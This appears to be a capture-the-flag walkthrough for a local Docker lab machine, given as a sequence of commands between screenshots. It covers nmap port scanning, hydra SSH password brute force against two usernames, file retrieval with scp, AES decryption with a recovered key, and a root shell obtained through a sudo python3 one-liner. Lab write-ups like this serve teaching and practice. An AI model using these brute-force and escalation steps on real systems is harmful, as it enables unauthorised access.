![image](https://github.com/user-attachments/assets/0fbe2e6c-c42a-4c45-8b6d-a0d4dbeb880a)

```bash
ping -c 1 172.17.0.2
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
nmap -sCV -p22,80 172.17.0.2 -oN targeted
```
![Pasted image 20250123113525](https://github.com/user-attachments/assets/bfd64cb4-66c0-4d4a-ba0e-2cb23d44ce5d)

## **we have port 80 enabled then proceed to search the web for information and source code**

![Pasted image 20250123113638](https://github.com/user-attachments/assets/26df8312-1eda-41cd-9c37-11754674f598)
![Pasted image 20250123113653](https://github.com/user-attachments/assets/bba6a835-e2e2-44f2-a368-6a50eee69255)

## **we can deduce that there is a user named “a” and we will do a brute force attack on port 22 where the SSH service runs**

```bash
hydra -l a -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```
![Pasted image 20250123114002](https://github.com/user-attachments/assets/38efaa8f-f9cd-431c-85ba-d26d00c0ac7c)

# **we will connect**

```bash
ssh a@172.17.0.2
```
![Pasted image 20250123114130](https://github.com/user-attachments/assets/0b846b22-da3b-44dc-a3b3-51524d738c15)

## **we will do a search of the files but we do not find any information but we know that all the information about servers is stored in /srv, we forgot to say that we do not have privileges to do a privilege escalation**

![Pasted image 20250123115133](https://github.com/user-attachments/assets/185e11bb-aa21-4f0c-8c33-a90b1724e682)

## **let's download all the information from that folder to investigate.**

```bash
scp a@172.17.0.2:/srv/ftp/mensaje_hash.txt . 
```
![Pasted image 20250123135545](https://github.com/user-attachments/assets/9db402ed-c01b-4d31-9083-d0342e396f4d)

## **we already have the files locally**

![Pasted image 20250123140805](https://github.com/user-attachments/assets/04590f36-555d-4a80-a6db-a407c63e183b)
![Pasted image 20250123140837](https://github.com/user-attachments/assets/498b7130-0841-41a4-84b4-b70f8b959c03)
![Pasted image 20250123140907](https://github.com/user-attachments/assets/3eaaf8ac-9023-44d7-8970-49999bd27150)
thisisaverysecretkey!

![Pasted image 20250123140934](https://github.com/user-attachments/assets/423f66f1-c52d-4e27-98f2-7d1dc90281a6)
890b787e76e086d3d76b3a5e9d6a7778

![Pasted image 20250123141049](https://github.com/user-attachments/assets/27de2cd5-3597-4498-830a-51585d9cc782)
7c6a180b36896a0a8c02787eeafb0e4c

![Pasted image 20250123141128](https://github.com/user-attachments/assets/04e91b1a-7460-4244-b9e6-0e6964898340)
![Pasted image 20250123141152](https://github.com/user-attachments/assets/998ac711-9cb8-4539-bc2e-5ef90fd8f7ab)
![Pasted image 20250123141314](https://github.com/user-attachments/assets/93176acd-21ef-4e75-ae95-bc834d15d932)

## **this is the info we have collected from the .txt files but one in particular says to decrypt a file with AES**
```bash
openssl enc -d -aes-128-cbc -in cifrado_aes.enc -out desencriptado_aes.txt -k thisisaverysecretkey!
```
![Pasted image 20250123142100](https://github.com/user-attachments/assets/81875fe1-63e3-4625-b40c-036b5fd32bce)

## **we found nothing we are going to use the user encointrado to do brute force**

```bash
hydra -l spencer -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```
![Pasted image 20250123142431](https://github.com/user-attachments/assets/6bbd8709-852d-4ec8-ac22-a0b1c0800a37)

```bash
ssh spencer@172.17.0.2
```
![Pasted image 20250123142550](https://github.com/user-attachments/assets/7e130557-88d6-4061-b21c-9680d923f704)

```bash
sudo -l
```
![Pasted image 20250123142619](https://github.com/user-attachments/assets/9468a998-e2c5-4237-826e-e5da75b8a781)
![Pasted image 20250123142719](https://github.com/user-attachments/assets/dcbb9ee5-bc85-4d6c-835b-ba3718767e19)

```bash
sudo python3 -c 'import os; os.system("/bin/sh")'
```
![Pasted image 20250123142755](https://github.com/user-attachments/assets/e05219c3-270a-4fad-be23-97d10525cfc7)

